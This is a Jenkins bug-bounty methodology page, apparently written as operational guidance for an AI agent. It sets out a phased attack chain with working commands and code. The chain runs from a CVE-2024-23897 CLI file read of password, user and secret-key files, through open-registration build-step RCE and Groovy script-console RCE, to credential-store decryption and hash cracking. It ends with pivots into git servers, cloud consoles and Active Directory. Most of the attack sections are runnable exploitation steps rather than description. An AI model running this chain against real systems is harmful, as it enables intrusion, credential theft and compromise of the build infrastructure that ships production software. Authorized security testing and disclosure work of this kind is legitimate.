---
technology: "Jenkins"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "3 evidence files (see ../internal coverage ledger)"
provenance: "field-mined from 3 engagements in the vault's evidence pool + upstream-verified 2026-11-12: jenkins.io security advisory 2024-01-24 (CVE-2024-23897: 2.441- and 2.426.2-and-earlier affected; @-file expansion disabled in 2.442/LTS 2.426.3/2.440.1), NVD CVE-2024-23897, Jenkins credential-decryption mechanics (master.key → SHA-256 → AES-128 → hudson.util.Secret → confidentiality key; AES-ECB legacy / AES-CBC modern formats) per public decryptor documentation. Tools with zero observed use (jenkins_offline_decrypt is observed-used; alternative decryptors named in prose only)."
---

Companion page: [[jenkins|Jenkins overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Jenkins Bug Bounty Methodology

**Scope:** the Jenkins controller and its trust surfaces — CLI, script console, registration/build permissions, credential store, `JENKINS_HOME` files — plus CI/CD pivots through pipelines. **Out of scope:** the git servers and cloud consoles Jenkins holds creds for (their units), generic Java deserialization gadget theory.

**Authorization:** presume written permission. Script-console and build-step execution is RCE on CI infrastructure that builds production — prefer read/demonstrate over destructive payloads; never decrypt credentials beyond proving the store is readable. Build-triggering on shared infrastructure can enqueue real production jobs — clean up any job you create.

## Decision tree (one screen)

1. Version footer ≤ 2.441 (LTS ≤ 2.426.2) → Phase 2 (unauth file read) FIRST — needs nothing else.
2. Registration open → Phase 3 (build-step RCE).
3. Any credentialed/admin access → Phase 4 (script console = everything).
4. File system or backup access → Phase 5 (offline vault decrypt).
5. Any of the above yields creds → Phase 6 (CI/CD pivot).

## Phase 1 — Fingerprinting

```bash
nmap -sC -sV example.com           # 8080/tcp open http Jenkins; X-Jenkins: 2.441 header
curl -s http://example.com:8080/ | grep -i jenkins   # footer version + login / "Sign in / create an account"
```

Record: exact version (drives Phase 2), whether registration is offered (`/signup`), whether `/script` redirects to login (console exists but gated), and `/jnlpJars/jenkins-cli.jar` reachability (needed for the CLI channel). Note install flavor from paths you later read: `/var/jenkins_home` (Docker), `/var/lib/jenkins` (package), `%USERPROFILE%\.jenkins` (Windows).

## Phase 2 — Unauthenticated file read (CVE-2024-23897)

Gate: Jenkins **2.441 and earlier, LTS 2.426.2 and earlier** (fixed 2.442 / LTS 2.426.3 / 2.440.1, which disable the CLI command parser's `@file` expansion — verified advisory). Grab the CLI jar *from the target* and expand files into arguments:

```bash
wget http://example.com:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -noCertificateCheck -s http://example.com:8080 help "@/etc/passwd"
# ERROR: Too many arguments: daemon:x:1:1:daemon...  ← first lines leak in the error
java -jar jenkins-cli.jar -noCertificateCheck -s http://example.com:8080 \
  connect-node "@/var/jenkins_home/users/users.xml"
# every line echoes back inside "No such agent <line> exists" errors — full-file read
```

Observed chain: `/etc/passwd` (confirmation) → `/proc/self/environ` (reveals `HOME=/var/jenkins_home`) → `users/users.xml` (user→directory map: `jennifer_12108429903186576833`) → `users/<dir>/config.xml` (`<passwordHash>#jbcrypt:$2a$10$…`) → john/rockyou crack → login. `help` leaks ~2 lines per call; `connect-node` (and any command echoing agent names) leaks the whole file. Read order once you know `JENKINS_HOME`: `users/users.xml`, `users/*/config.xml`, `config.xml` (instance config), `credentials.xml`, `secrets/master.key`, `secrets/hudson.util.Secret` — the last three turn the file read into the offline vault (Phase 5).

## Phase 3 — Registration → build-step execution

When `/signup` lets you register (gate: admin left "Jenkins' own user database" + registration open) and the new user carries job/project **create** permissions (observed: the user had "overall create, read, delete" but *not* build-from-UI):

1. Create a project; **Configure → Build Triggers → Trigger builds remotely** → set an authentication token (yours).
2. **Add build step → Execute shell / Execute Windows batch command** → `whoami` (or file-read commands: `type C:\Users\<u>\.jenkins\secrets\master.key`).
3. Get your API token (user → Configure → Add new Token) and trigger via API:

```bash
curl -X POST -u «user»:«api-token» \
  "http://example.com:8080/job/<project>/build?token=«trigger-token»"
# then read the build's console output via the UI or /job/<p>/<n>/consoleText
```

Observed (Windows, egress-blocked): no reverse shell possible — the build console output *was* the shell; everything (dir listings, `type` of secret files, PowerShell base64 staging) ran as batch commands with output read from the console page. Treat build-step RCE and script console as equivalent impact.

## Phase 4 — Script console (Groovy)

With any credentialed access that reaches `/script` (admins; also many exploited versions hand it over):

```groovy
println( "whoami".execute().text )                                   // RCE (Linux) / "cmd /c whoami".execute().text
println( hudson.util.Secret.decrypt("{AQAAABAAAAow…}") )             // decrypt one vault entry in-process
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(...)
creds.each { println it.id + " " + it.secret }                       // enumerate the store
```

Observed (post-crack): a stored SSH-key credential appeared as `{AQAAABAAAA…}`; `hudson.util.Secret.decrypt()` on `/script` printed the plaintext key → root SSH. The console also runs file ops (`new File("/var/jenkins_home/secrets/master.key").text`) — a one-stop shop for every other phase.

## Phase 5 — Credential store decryption (files you hold)

Files: `secrets/master.key`, `secrets/hudson.util.Secret`, `credentials.xml` (+ `jobs/*/config.xml` for inline `<password>{…}</password>` blobs). Mechanics (verified from public decryptor docs): master.key is hashed (SHA-256) into an AES-128 key → decrypt `hudson.util.Secret` (AES-ECB legacy / AES-CBC with 0x01 version byte modern) → its leading bytes (before the `::::MAGIC::::` marker) are the confidentiality key → decrypt `{AQAAABAAA…}` base64 blobs.

Observed workflows: offline via the jenkins_offline_decrypt script given the three files (observed: `python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml` → plaintext); or grep-first over a leaked archive — `grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" .` finds every encrypted blob across `jobs/*/config.xml` and `credentials.xml` (observed: rsync'd `jenkins.tar.gz` → grep → `{AQAAABAAAAAQUNBJaKiUQNa…}` in `jobs/build/config.xml` → decrypt → GitLab password). The same archive holds `users/*/config.xml` bcrypt hashes as a bonus.

## Phase 6 — CI/CD pivot (what the creds unlock)

The vault's contents are the engagement: SCM credentials → gitea/gitlab units (clone private repos, abuse webhooks — a decrypted password logged into GitLab, whose repo webhook gave container RCE); cloud keys → cloud consoles; SSH keys → agents and hosts; pipeline definitions (`Jenkinsfile` in repos, `jobs/*/config.xml`) name downstream systems and often embed more secrets. On AD-integrated Windows controllers, the foothold user's domain rights are the next surface (observed: ForceChangePassword → GenericWrite → WriteOwner chain — ad-acl unit territory).

## Disclosure notes

- CVE-2024-23897 claims: cite the exact version and both evidence commands; the advisory's fix (disabling `@file` expansion) is the remediation line for the report.
- Registration + build-step RCE: the misconfig is *open registration combined with job-create*; report the permission matrix you actually had.
- Credential store: report which blobs decrypted and through which access path (in-process console vs offline files) — offline decryption from a leaked backup is an *infrastructure* finding (the backup exposure) as much as a Jenkins one.
- Build artifacts: delete projects you created, note triggered build numbers.

## Appendix A — Tool mapping (prose)

- **jenkins-cli.jar** (served by the controller at `/jnlpJars/`) — the CVE-2024-23897 channel: `help "@/path"`, `connect-node "@/path"`, `-noCertificateCheck -s URL`.
- **curl** — API build triggering with user API token + job trigger token; consoleText retrieval.
- **john / hashcat** — `#jbcrypt:$2a$…` user password hashes (observed: john with rockyou).
- **jenkins_offline_decrypt** (python script) — offline vault decryption from master.key + hudson.util.Secret + credentials.xml; alternative public decryptor tools exist with the same input set.
- **grep / strings** — blob harvest over leaked archives (`grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" .`).
- **rsync / backup tooling** — how the observed `JENKINS_HOME` archives were obtained (see the rsync unit).
- **PowerShell / cmd via build steps** — Windows controllers where egress filtering kills shells (the observed channel).
